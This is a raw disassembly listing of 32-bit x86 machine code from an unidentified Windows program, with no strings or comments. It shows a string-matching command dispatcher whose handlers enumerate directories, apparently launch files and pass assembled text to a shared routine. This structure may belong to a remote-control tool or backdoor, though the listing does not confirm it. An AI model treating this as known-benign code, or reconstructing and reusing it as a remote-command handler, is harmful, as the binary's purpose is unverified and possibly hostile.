  40bb9d:	e8 4a 97 ff ff       	call   0x4052ec
  40bba2:	e9 3f fd ff ff       	jmp    0x40b8e6
  40bba7:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40bbaa:	68 78 13 41 00       	push   $0x411378
  40bbaf:	50                   	push   %eax
  40bbb0:	ff d3                	call   *%ebx
  40bbb2:	59                   	pop    %ecx
  40bbb3:	84 c0                	test   %al,%al
  40bbb5:	59                   	pop    %ecx
  40bbb6:	74 48                	je     0x40bc00
  40bbb8:	83 65 b0 00          	andl   $0x0,-0x50(%ebp)
  40bbbc:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  40bbc0:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40bbc3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40bbc6:	50                   	push   %eax
  40bbc7:	8d 45 08             	lea    0x8(%ebp),%eax
  40bbca:	50                   	push   %eax
  40bbcb:	6a 01                	push   $0x1
  40bbcd:	e8 b7 56 ff ff       	call   0x401289
  40bbd2:	8b c8                	mov    %eax,%ecx
  40bbd4:	ff 15 58 02 41 00    	call   *0x410258
  40bbda:	50                   	push   %eax
  40bbdb:	e8 70 2b 00 00       	call   0x40e750
  40bbe0:	83 c4 0c             	add    $0xc,%esp
  40bbe3:	3c 01                	cmp    $0x1,%al
  40bbe5:	0f 85 8a 00 00 00    	jne    0x40bc75
  40bbeb:	ff 75 08             	push   0x8(%ebp)
  40bbee:	e8 f9 96 ff ff       	call   0x4052ec
  40bbf3:	ff 75 08             	push   0x8(%ebp)
  40bbf6:	e8 31 40 00 00       	call   0x40fc2c
  40bbfb:	e9 e5 fc ff ff       	jmp    0x40b8e5
  40bc00:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40bc03:	68 70 13 41 00       	push   $0x411370
  40bc08:	50                   	push   %eax
  40bc09:	ff d3                	call   *%ebx
  40bc0b:	59                   	pop    %ecx
  40bc0c:	84 c0                	test   %al,%al
  40bc0e:	59                   	pop    %ecx
  40bc0f:	74 07                	je     0x40bc18
  40bc11:	e8 3f a4 ff ff       	call   0x406055
  40bc16:	eb 5d                	jmp    0x40bc75
  40bc18:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40bc1b:	68 60 13 41 00       	push   $0x411360
  40bc20:	50                   	push   %eax
  40bc21:	ff d3                	call   *%ebx
  40bc23:	59                   	pop    %ecx
  40bc24:	84 c0                	test   %al,%al
  40bc26:	59                   	pop    %ecx
  40bc27:	74 1d                	je     0x40bc46
  40bc29:	6a 01                	push   $0x1
  40bc2b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40bc2e:	e8 56 56 ff ff       	call   0x401289
  40bc33:	83 ec 10             	sub    $0x10,%esp
  40bc36:	8b cc                	mov    %esp,%ecx
  40bc38:	50                   	push   %eax
  40bc39:	ff 15 60 02 41 00    	call   *0x410260
  40bc3f:	e8 4a 15 00 00       	call   0x40d18e
  40bc44:	eb 2c                	jmp    0x40bc72
  40bc46:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40bc49:	68 b8 12 41 00       	push   $0x4112b8
  40bc4e:	50                   	push   %eax
  40bc4f:	ff d3                	call   *%ebx
  40bc51:	59                   	pop    %ecx
  40bc52:	84 c0                	test   %al,%al
  40bc54:	59                   	pop    %ecx
  40bc55:	74 1e                	je     0x40bc75
  40bc57:	6a 01                	push   $0x1
  40bc59:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40bc5c:	e8 28 56 ff ff       	call   0x401289
  40bc61:	83 ec 10             	sub    $0x10,%esp
  40bc64:	8b cc                	mov    %esp,%ecx
  40bc66:	50                   	push   %eax
  40bc67:	ff 15 60 02 41 00    	call   *0x410260
  40bc6d:	e8 1f e1 ff ff       	call   0x409d91
  40bc72:	83 c4 10             	add    $0x10,%esp
  40bc75:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40bc78:	ff 15 54 02 41 00    	call   *0x410254
  40bc7e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40bc81:	e8 b6 5e ff ff       	call   0x401b3c
  40bc86:	8d 8d 14 ff ff ff    	lea    -0xec(%ebp),%ecx
  40bc8c:	ff 15 54 02 41 00    	call   *0x410254
  40bc92:	5f                   	pop    %edi
  40bc93:	5e                   	pop    %esi
  40bc94:	33 c0                	xor    %eax,%eax
  40bc96:	5b                   	pop    %ebx
  40bc97:	c9                   	leave
  40bc98:	c2 04 00             	ret    $0x4
  40bc9b:	55                   	push   %ebp
  40bc9c:	8b ec                	mov    %esp,%ebp
  40bc9e:	81 ec a8 02 00 00    	sub    $0x2a8,%esp
  40bca4:	53                   	push   %ebx
  40bca5:	56                   	push   %esi
  40bca6:	8d 85 58 fd ff ff    	lea    -0x2a8(%ebp),%eax
  40bcac:	57                   	push   %edi
  40bcad:	50                   	push   %eax
  40bcae:	8d 4d 18             	lea    0x18(%ebp),%ecx
  40bcb1:	ff 15 c4 02 41 00    	call   *0x4102c4
  40bcb7:	50                   	push   %eax
  40bcb8:	ff 15 6c 01 41 00    	call   *0x41016c
  40bcbe:	83 f8 ff             	cmp    $0xffffffff,%eax
  40bcc1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40bcc4:	75 7f                	jne    0x40bd45
  40bcc6:	8d 45 18             	lea    0x18(%ebp),%eax
  40bcc9:	50                   	push   %eax
  40bcca:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40bccd:	50                   	push   %eax
  40bcce:	e8 00 31 00 00       	call   0x40edd3
  40bcd3:	51                   	push   %ecx
  40bcd4:	51                   	push   %ecx
  40bcd5:	8b f4                	mov    %esp,%esi
  40bcd7:	50                   	push   %eax
  40bcd8:	b8 68 52 41 00       	mov    $0x415268,%eax
  40bcdd:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40bce0:	50                   	push   %eax
  40bce1:	51                   	push   %ecx
  40bce2:	50                   	push   %eax
  40bce3:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40bce6:	68 50 16 41 00       	push   $0x411650
  40bceb:	50                   	push   %eax
  40bcec:	e8 29 3f 00 00       	call   0x40fc1a
  40bcf1:	83 c4 0c             	add    $0xc,%esp
  40bcf4:	50                   	push   %eax
  40bcf5:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40bcf8:	50                   	push   %eax
  40bcf9:	e8 16 3f 00 00       	call   0x40fc14
  40bcfe:	83 c4 0c             	add    $0xc,%esp
  40bd01:	50                   	push   %eax
  40bd02:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40bd05:	50                   	push   %eax
  40bd06:	e8 09 3f 00 00       	call   0x40fc14
  40bd0b:	83 c4 0c             	add    $0xc,%esp
  40bd0e:	50                   	push   %eax
  40bd0f:	56                   	push   %esi
  40bd10:	e8 ff 3e 00 00       	call   0x40fc14
  40bd15:	83 c4 0c             	add    $0xc,%esp
  40bd18:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40bd1d:	e8 76 64 ff ff       	call   0x402198
  40bd22:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40bd25:	ff 15 54 02 41 00    	call   *0x410254
  40bd2b:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40bd2e:	ff 15 54 02 41 00    	call   *0x410254
  40bd34:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40bd37:	ff 15 54 02 41 00    	call   *0x410254
  40bd3d:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40bd40:	e9 40 01 00 00       	jmp    0x40be85
  40bd45:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40bd48:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40bd4b:	50                   	push   %eax
  40bd4c:	ff 15 50 02 41 00    	call   *0x410250
  40bd52:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40bd55:	68 a8 07 41 00       	push   $0x4107a8
  40bd5a:	50                   	push   %eax
  40bd5b:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  40bd61:	50                   	push   %eax
  40bd62:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40bd65:	ff 15 bc 02 41 00    	call   *0x4102bc
  40bd6b:	50                   	push   %eax
  40bd6c:	ff 15 c4 01 41 00    	call   *0x4101c4
  40bd72:	59                   	pop    %ecx
  40bd73:	8a d8                	mov    %al,%bl
  40bd75:	59                   	pop    %ecx
  40bd76:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40bd79:	ff 15 c0 02 41 00    	call   *0x4102c0
  40bd7f:	84 db                	test   %bl,%bl
  40bd81:	bf 50 02 00 00       	mov    $0x250,%edi
  40bd86:	74 28                	je     0x40bdb0
  40bd88:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40bd8b:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40bd8e:	50                   	push   %eax
  40bd8f:	8d 85 58 fd ff ff    	lea    -0x2a8(%ebp),%eax
  40bd95:	57                   	push   %edi
  40bd96:	50                   	push   %eax
  40bd97:	ff 15 70 02 41 00    	call   *0x410270
  40bd9d:	50                   	push   %eax
  40bd9e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40bda1:	ff 15 64 02 41 00    	call   *0x410264
  40bda7:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40bdaa:	ff 15 54 02 41 00    	call   *0x410254
  40bdb0:	8b 35 70 01 41 00    	mov    0x410170,%esi
  40bdb6:	8d 85 58 fd ff ff    	lea    -0x2a8(%ebp),%eax
  40bdbc:	50                   	push   %eax
  40bdbd:	ff 75 f8             	push   -0x8(%ebp)
  40bdc0:	ff d6                	call   *%esi
  40bdc2:	85 c0                	test   %eax,%eax
  40bdc4:	74 4e                	je     0x40be14
  40bdc6:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40bdc9:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40bdcc:	50                   	push   %eax
  40bdcd:	8d 85 58 fd ff ff    	lea    -0x2a8(%ebp),%eax
  40bdd3:	57                   	push   %edi
  40bdd4:	50                   	push   %eax
  40bdd5:	ff 15 70 02 41 00    	call   *0x410270
  40bddb:	50                   	push   %eax
  40bddc:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40bddf:	50                   	push   %eax
  40bde0:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40bde3:	50                   	push   %eax
  40bde4:	e8 2b 3e 00 00       	call   0x40fc14
  40bde9:	83 c4 0c             	add    $0xc,%esp
  40bdec:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40bdef:	50                   	push   %eax
  40bdf0:	ff 15 64 02 41 00    	call   *0x410264
  40bdf6:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40bdf9:	ff 15 54 02 41 00    	call   *0x410254
  40bdff:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40be02:	ff 15 54 02 41 00    	call   *0x410254
  40be08:	8d 85 58 fd ff ff    	lea    -0x2a8(%ebp),%eax
  40be0e:	50                   	push   %eax
  40be0f:	ff 75 f8             	push   -0x8(%ebp)
  40be12:	eb ac                	jmp    0x40bdc0
  40be14:	83 ec 10             	sub    $0x10,%esp
  40be17:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40be1a:	8b f4                	mov    %esp,%esi
  40be1c:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40be1f:	50                   	push   %eax
  40be20:	b8 68 52 41 00       	mov    $0x415268,%eax
  40be25:	50                   	push   %eax
  40be26:	51                   	push   %ecx
  40be27:	50                   	push   %eax
  40be28:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40be2b:	68 44 16 41 00       	push   $0x411644
  40be30:	50                   	push   %eax
  40be31:	e8 e4 3d 00 00       	call   0x40fc1a
  40be36:	83 c4 0c             	add    $0xc,%esp
  40be39:	50                   	push   %eax
  40be3a:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40be3d:	50                   	push   %eax
  40be3e:	e8 d1 3d 00 00       	call   0x40fc14
  40be43:	83 c4 0c             	add    $0xc,%esp
  40be46:	50                   	push   %eax
  40be47:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40be4a:	50                   	push   %eax
  40be4b:	e8 c4 3d 00 00       	call   0x40fc14
  40be50:	83 c4 0c             	add    $0xc,%esp
  40be53:	50                   	push   %eax
  40be54:	56                   	push   %esi
  40be55:	e8 ba 3d 00 00       	call   0x40fc14
  40be5a:	83 c4 0c             	add    $0xc,%esp
  40be5d:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40be62:	e8 31 63 ff ff       	call   0x402198
  40be67:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40be6a:	ff 15 54 02 41 00    	call   *0x410254
  40be70:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40be73:	ff 15 54 02 41 00    	call   *0x410254
  40be79:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40be7c:	ff 15 54 02 41 00    	call   *0x410254
  40be82:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40be85:	ff 15 54 02 41 00    	call   *0x410254
  40be8b:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40be8e:	ff 15 54 02 41 00    	call   *0x410254
  40be94:	8d 4d 18             	lea    0x18(%ebp),%ecx
  40be97:	ff 15 c0 02 41 00    	call   *0x4102c0
  40be9d:	5f                   	pop    %edi
  40be9e:	5e                   	pop    %esi
  40be9f:	5b                   	pop    %ebx
  40bea0:	c9                   	leave
  40bea1:	c3                   	ret
  40bea2:	55                   	push   %ebp
  40bea3:	8b ec                	mov    %esp,%ebp
  40bea5:	81 ec 14 01 00 00    	sub    $0x114,%esp
  40beab:	53                   	push   %ebx
  40beac:	56                   	push   %esi
  40bead:	57                   	push   %edi
  40beae:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40beb1:	83 ec 10             	sub    $0x10,%esp
  40beb4:	8b cc                	mov    %esp,%ecx
  40beb6:	50                   	push   %eax
  40beb7:	68 58 08 41 00       	push   $0x410858
  40bebc:	ff 15 4c 02 41 00    	call   *0x41024c
  40bec2:	83 ec 10             	sub    $0x10,%esp
  40bec5:	8d 45 08             	lea    0x8(%ebp),%eax
  40bec8:	8b cc                	mov    %esp,%ecx
  40beca:	50                   	push   %eax
  40becb:	ff 15 60 02 41 00    	call   *0x410260
  40bed1:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40bed4:	50                   	push   %eax
  40bed5:	e8 db 30 00 00       	call   0x40efb5
  40beda:	83 c4 24             	add    $0x24,%esp
  40bedd:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40bee0:	33 ff                	xor    %edi,%edi
  40bee2:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40bee5:	50                   	push   %eax
  40bee6:	57                   	push   %edi
  40bee7:	e8 9d 53 ff ff       	call   0x401289
  40beec:	8b c8                	mov    %eax,%ecx
  40beee:	ff 15 58 02 41 00    	call   *0x410258
  40bef4:	50                   	push   %eax
  40bef5:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40bef8:	ff 15 4c 02 41 00    	call   *0x41024c
  40befe:	8b 35 38 02 41 00    	mov    0x410238,%esi
  40bf04:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40bf07:	68 00 17 41 00       	push   $0x411700
  40bf0c:	50                   	push   %eax
  40bf0d:	ff d6                	call   *%esi
  40bf0f:	59                   	pop    %ecx
  40bf10:	84 c0                	test   %al,%al
  40bf12:	59                   	pop    %ecx
  40bf13:	0f 84 df 00 00 00    	je     0x40bff8
  40bf19:	8d 85 14 ff ff ff    	lea    -0xec(%ebp),%eax
  40bf1f:	50                   	push   %eax
  40bf20:	6a 64                	push   $0x64
  40bf22:	ff 15 d4 00 41 00    	call   *0x4100d4
  40bf28:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40bf2b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40bf2e:	50                   	push   %eax
  40bf2f:	8d 85 14 ff ff ff    	lea    -0xec(%ebp),%eax
  40bf35:	6a 64                	push   $0x64
  40bf37:	50                   	push   %eax
  40bf38:	ff 15 70 02 41 00    	call   *0x410270
  40bf3e:	6a 02                	push   $0x2
  40bf40:	57                   	push   %edi
  40bf41:	68 fc 16 41 00       	push   $0x4116fc
  40bf46:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40bf49:	ff 15 d8 01 41 00    	call   *0x4101d8
  40bf4f:	40                   	inc    %eax
  40bf50:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40bf53:	50                   	push   %eax
  40bf54:	ff 15 5c 02 41 00    	call   *0x41025c
  40bf5a:	83 ec 10             	sub    $0x10,%esp
  40bf5d:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40bf60:	8b cc                	mov    %esp,%ecx
  40bf62:	50                   	push   %eax
  40bf63:	ff 15 60 02 41 00    	call   *0x410260
  40bf69:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40bf6c:	50                   	push   %eax
  40bf6d:	e8 74 c4 ff ff       	call   0x4083e6
  40bf72:	59                   	pop    %ecx
  40bf73:	be 68 52 41 00       	mov    $0x415268,%esi
  40bf78:	8b fc                	mov    %esp,%edi
  40bf7a:	50                   	push   %eax
  40bf7b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40bf7e:	56                   	push   %esi
  40bf7f:	50                   	push   %eax
  40bf80:	56                   	push   %esi
  40bf81:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  40bf87:	68 f0 16 41 00       	push   $0x4116f0
  40bf8c:	50                   	push   %eax
  40bf8d:	e8 88 3c 00 00       	call   0x40fc1a
  40bf92:	83 c4 0c             	add    $0xc,%esp
  40bf95:	50                   	push   %eax
  40bf96:	8d 45 98             	lea    -0x68(%ebp),%eax
  40bf99:	50                   	push   %eax
  40bf9a:	e8 75 3c 00 00       	call   0x40fc14
  40bf9f:	83 c4 0c             	add    $0xc,%esp
  40bfa2:	50                   	push   %eax
  40bfa3:	8d 45 88             	lea    -0x78(%ebp),%eax
  40bfa6:	50                   	push   %eax
  40bfa7:	e8 68 3c 00 00       	call   0x40fc14
  40bfac:	83 c4 0c             	add    $0xc,%esp
  40bfaf:	50                   	push   %eax
  40bfb0:	57                   	push   %edi
  40bfb1:	e8 5e 3c 00 00       	call   0x40fc14
  40bfb6:	83 c4 0c             	add    $0xc,%esp
  40bfb9:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40bfbe:	e8 d5 61 ff ff       	call   0x402198
  40bfc3:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  40bfc6:	ff 15 54 02 41 00    	call   *0x410254
  40bfcc:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  40bfcf:	ff 15 54 02 41 00    	call   *0x410254
  40bfd5:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  40bfdb:	ff 15 54 02 41 00    	call   *0x410254
  40bfe1:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40bfe4:	ff 15 54 02 41 00    	call   *0x410254
  40bfea:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40bfed:	ff 15 54 02 41 00    	call   *0x410254
  40bff3:	e9 28 06 00 00       	jmp    0x40c620
  40bff8:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40bffb:	68 e4 16 41 00       	push   $0x4116e4
  40c000:	50                   	push   %eax
  40c001:	ff d6                	call   *%esi
  40c003:	59                   	pop    %ecx
  40c004:	84 c0                	test   %al,%al
  40c006:	59                   	pop    %ecx
  40c007:	74 3b                	je     0x40c044
  40c009:	6a 02                	push   $0x2
  40c00b:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c00e:	e8 76 52 ff ff       	call   0x401289
  40c013:	83 ec 10             	sub    $0x10,%esp
  40c016:	8b cc                	mov    %esp,%ecx
  40c018:	50                   	push   %eax
  40c019:	51                   	push   %ecx
  40c01a:	e8 2c 2e 00 00       	call   0x40ee4b
  40c01f:	59                   	pop    %ecx
  40c020:	59                   	pop    %ecx
  40c021:	6a 01                	push   $0x1
  40c023:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c026:	e8 5e 52 ff ff       	call   0x401289
  40c02b:	83 ec 10             	sub    $0x10,%esp
  40c02e:	8b cc                	mov    %esp,%ecx
  40c030:	50                   	push   %eax
  40c031:	ff 15 60 02 41 00    	call   *0x410260
  40c037:	e8 5f fc ff ff       	call   0x40bc9b
  40c03c:	83 c4 20             	add    $0x20,%esp
  40c03f:	e9 dc 05 00 00       	jmp    0x40c620
  40c044:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c047:	68 18 07 41 00       	push   $0x410718
  40c04c:	50                   	push   %eax
  40c04d:	ff d6                	call   *%esi
  40c04f:	59                   	pop    %ecx
  40c050:	84 c0                	test   %al,%al
  40c052:	59                   	pop    %ecx
  40c053:	74 37                	je     0x40c08c
  40c055:	6a 05                	push   $0x5
  40c057:	57                   	push   %edi
  40c058:	57                   	push   %edi
  40c059:	6a 01                	push   $0x1
  40c05b:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c05e:	e8 26 52 ff ff       	call   0x401289
  40c063:	50                   	push   %eax
  40c064:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40c067:	50                   	push   %eax
  40c068:	e8 de 2d 00 00       	call   0x40ee4b
  40c06d:	59                   	pop    %ecx
  40c06e:	59                   	pop    %ecx
  40c06f:	8b c8                	mov    %eax,%ecx
  40c071:	ff 15 c4 02 41 00    	call   *0x4102c4
  40c077:	50                   	push   %eax
  40c078:	68 d8 16 41 00       	push   $0x4116d8
  40c07d:	57                   	push   %edi
  40c07e:	ff 15 cc 03 41 00    	call   *0x4103cc
  40c084:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40c087:	e9 54 02 00 00       	jmp    0x40c2e0
  40c08c:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c08f:	68 cc 16 41 00       	push   $0x4116cc
  40c094:	50                   	push   %eax
  40c095:	ff d6                	call   *%esi
  40c097:	59                   	pop    %ecx
  40c098:	84 c0                	test   %al,%al
  40c09a:	59                   	pop    %ecx
  40c09b:	74 65                	je     0x40c102
  40c09d:	6a 04                	push   $0x4
  40c09f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c0a2:	e8 e2 51 ff ff       	call   0x401289
  40c0a7:	83 ec 10             	sub    $0x10,%esp
  40c0aa:	8b cc                	mov    %esp,%ecx
  40c0ac:	50                   	push   %eax
  40c0ad:	ff 15 60 02 41 00    	call   *0x410260
  40c0b3:	6a 03                	push   $0x3
  40c0b5:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c0b8:	e8 cc 51 ff ff       	call   0x401289
  40c0bd:	83 ec 10             	sub    $0x10,%esp
  40c0c0:	8b cc                	mov    %esp,%ecx
  40c0c2:	50                   	push   %eax
  40c0c3:	ff 15 60 02 41 00    	call   *0x410260
  40c0c9:	6a 02                	push   $0x2
  40c0cb:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c0ce:	e8 b6 51 ff ff       	call   0x401289
  40c0d3:	83 ec 10             	sub    $0x10,%esp
  40c0d6:	8b cc                	mov    %esp,%ecx
  40c0d8:	50                   	push   %eax
  40c0d9:	ff 15 60 02 41 00    	call   *0x410260
  40c0df:	6a 01                	push   $0x1
  40c0e1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c0e4:	e8 a0 51 ff ff       	call   0x401289
  40c0e9:	83 ec 10             	sub    $0x10,%esp
  40c0ec:	8b cc                	mov    %esp,%ecx
  40c0ee:	50                   	push   %eax
  40c0ef:	ff 15 60 02 41 00    	call   *0x410260
  40c0f5:	e8 a1 09 00 00       	call   0x40ca9b
  40c0fa:	83 c4 40             	add    $0x40,%esp
  40c0fd:	e9 1e 05 00 00       	jmp    0x40c620
  40c102:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c105:	68 c4 16 41 00       	push   $0x4116c4
  40c10a:	50                   	push   %eax
  40c10b:	ff d6                	call   *%esi
  40c10d:	59                   	pop    %ecx
  40c10e:	84 c0                	test   %al,%al
  40c110:	59                   	pop    %ecx
  40c111:	0f 84 43 01 00 00    	je     0x40c25a
  40c117:	57                   	push   %edi
  40c118:	6a 04                	push   $0x4
  40c11a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c11d:	e8 67 51 ff ff       	call   0x401289
  40c122:	83 ec 10             	sub    $0x10,%esp
  40c125:	be 68 52 41 00       	mov    $0x415268,%esi
  40c12a:	8b fc                	mov    %esp,%edi
  40c12c:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c12f:	50                   	push   %eax
  40c130:	56                   	push   %esi
  40c131:	6a 03                	push   $0x3
  40c133:	e8 51 51 ff ff       	call   0x401289
  40c138:	50                   	push   %eax
  40c139:	56                   	push   %esi
  40c13a:	6a 02                	push   $0x2
  40c13c:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c13f:	e8 45 51 ff ff       	call   0x401289
  40c144:	50                   	push   %eax
  40c145:	56                   	push   %esi
  40c146:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40c149:	68 b4 16 41 00       	push   $0x4116b4
  40c14e:	50                   	push   %eax
  40c14f:	e8 c6 3a 00 00       	call   0x40fc1a
  40c154:	83 c4 0c             	add    $0xc,%esp
  40c157:	50                   	push   %eax
  40c158:	8d 45 98             	lea    -0x68(%ebp),%eax
  40c15b:	50                   	push   %eax
  40c15c:	e8 b3 3a 00 00       	call   0x40fc14
  40c161:	83 c4 0c             	add    $0xc,%esp
  40c164:	50                   	push   %eax
  40c165:	8d 45 88             	lea    -0x78(%ebp),%eax
  40c168:	50                   	push   %eax
  40c169:	e8 a6 3a 00 00       	call   0x40fc14
  40c16e:	83 c4 0c             	add    $0xc,%esp
  40c171:	50                   	push   %eax
  40c172:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  40c178:	50                   	push   %eax
  40c179:	e8 96 3a 00 00       	call   0x40fc14
  40c17e:	83 c4 0c             	add    $0xc,%esp
  40c181:	50                   	push   %eax
  40c182:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40c185:	50                   	push   %eax
  40c186:	e8 89 3a 00 00       	call   0x40fc14
  40c18b:	83 c4 0c             	add    $0xc,%esp
  40c18e:	50                   	push   %eax
  40c18f:	57                   	push   %edi
  40c190:	e8 7f 3a 00 00       	call   0x40fc14
  40c195:	83 c4 0c             	add    $0xc,%esp
  40c198:	e8 52 64 ff ff       	call   0x4025ef
  40c19d:	83 c4 14             	add    $0x14,%esp
  40c1a0:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40c1a3:	8b f0                	mov    %eax,%esi
  40c1a5:	ff 15 54 02 41 00    	call   *0x410254
  40c1ab:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  40c1b1:	ff 15 54 02 41 00    	call   *0x410254
  40c1b7:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  40c1ba:	ff 15 54 02 41 00    	call   *0x410254
  40c1c0:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  40c1c3:	ff 15 54 02 41 00    	call   *0x410254
  40c1c9:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40c1cc:	ff 15 54 02 41 00    	call   *0x410254
  40c1d2:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40c1d5:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40c1d8:	50                   	push   %eax
  40c1d9:	ff 15 50 02 41 00    	call   *0x410250
  40c1df:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40c1e2:	50                   	push   %eax
  40c1e3:	56                   	push   %esi
  40c1e4:	e8 56 04 00 00       	call   0x40c63f
  40c1e9:	59                   	pop    %ecx
  40c1ea:	8a d8                	mov    %al,%bl
  40c1ec:	59                   	pop    %ecx
  40c1ed:	56                   	push   %esi
  40c1ee:	e8 2d 3d 00 00       	call   0x40ff20
  40c1f3:	84 db                	test   %bl,%bl
  40c1f5:	74 5b                	je     0x40c252
  40c1f7:	6a 01                	push   $0x1
  40c1f9:	6a 20                	push   $0x20
  40c1fb:	6a 01                	push   $0x1
  40c1fd:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c200:	e8 84 50 ff ff       	call   0x401289
  40c205:	8b c8                	mov    %eax,%ecx
  40c207:	ff 15 58 02 41 00    	call   *0x410258
  40c20d:	50                   	push   %eax
  40c20e:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  40c214:	ff 15 2c 02 41 00    	call   *0x41022c
  40c21a:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40c21d:	ff 15 90 02 41 00    	call   *0x410290
  40c223:	50                   	push   %eax
  40c224:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40c227:	ff 15 58 02 41 00    	call   *0x410258
  40c22d:	50                   	push   %eax
  40c22e:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  40c234:	ff 15 7c 02 41 00    	call   *0x41027c
  40c23a:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  40c240:	ff 15 fc 02 41 00    	call   *0x4102fc
  40c246:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  40c24c:	ff 15 f8 02 41 00    	call   *0x4102f8
  40c252:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40c255:	e9 93 fd ff ff       	jmp    0x40bfed
  40c25a:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c25d:	68 ac 16 41 00       	push   $0x4116ac
  40c262:	50                   	push   %eax
  40c263:	ff d6                	call   *%esi
  40c265:	59                   	pop    %ecx
  40c266:	84 c0                	test   %al,%al
  40c268:	59                   	pop    %ecx
  40c269:	0f 84 a1 00 00 00    	je     0x40c310
  40c26f:	6a 01                	push   $0x1
  40c271:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c274:	e8 10 50 ff ff       	call   0x401289
  40c279:	50                   	push   %eax
